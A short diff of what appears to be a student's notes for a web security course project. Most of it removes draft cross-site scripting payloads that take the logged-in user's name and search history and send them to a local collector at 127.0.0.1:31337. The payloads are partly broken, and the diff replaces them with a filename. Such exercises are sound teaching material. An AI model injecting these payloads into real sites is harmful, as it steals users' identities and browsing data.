@@ -1,23 +1,5 @@
-<script>
- form = document.createElement('form');
-        form.setAttribute('method', 'POST');
-        form.setAttribute('action', 'http://127.0.0.1:31337/');
-        myvar = document.createElement('input');
-        myvar.setAttribute('name', document.getElementById('logged-in-user'));
-        myvar.setAttribute('history', document.getElementById('history-list').innerHTML);
-        form.appendChild(myvar);
-        document.body.appendChild(form);
-        form.submit();
 
-</script>
-.getElementsByClassName("row")
-
-https://ecen5032.org/project2/search?q=<script>var url="127.0.0.1:31337/stolen";var params="user="+document.getElementById('logged-in-user').innerHTML+"&last_search"+window.onload=function(){document.getElementsByClassName('history-item list-group-item').item(1))};console.log(total)</script>
-
-
-
-
-
+xss_payload.html
 
 
 <script>var id = document.getElementById('logged-in-user').innerHTML;</script>
